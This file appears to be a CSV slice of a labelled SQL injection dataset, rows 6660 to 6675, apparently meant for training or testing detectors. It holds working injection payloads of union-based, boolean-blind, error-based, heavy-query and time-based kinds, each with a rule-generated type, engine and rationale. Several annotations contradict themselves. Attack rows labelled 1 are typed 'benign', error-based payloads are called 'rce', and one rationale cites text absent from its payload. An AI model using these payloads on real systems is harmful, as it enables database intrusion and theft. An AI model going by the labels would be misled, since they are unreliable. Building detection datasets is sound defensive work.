row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
6660,"-9959"" ) where 7073 = 7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6661,"-6381%"" ) ) ) union all select 1503,1503,1503,1503#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6662,1' and 7533 = 7533 and 'clqy' like 'clqy,1,,boolean_blind,generic,0.95,"7533 = 7533 and, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
6663,"1'+ ( select 'rguk' where 6019 = 6019 union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6664,"1%"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
6665,-5286' or 6783 = 1233,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6666,"1%"" ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ""%"" = """,1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
6667,"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'xonc' = 'xonc",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
6668,1 waitfor delay '0:0:5'# opyp,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
6669,"1' ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
6670,1'|| ( select 'xugb' from dual where 6772 = 6772,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6671,"1"" union all select null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
6672,-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,1,,boolean_blind,postgresql,0.95,2360 = 2360 or detected — boolean_blind injection (priority 8) on postgresql,rule-based
6673,1 ) where 1079 = 1079,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6674,"1"" and ( 7424 = 2381 ) *2381 and ""dvju"" = ""dvju",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
6675,1'+ ( select 'vtyw' where 7950 = 7950 order by 1--,1,,boolean_blind,generic,0.95,7950 = 7950 or detected — boolean_blind injection (priority 8) on generic,rule-based
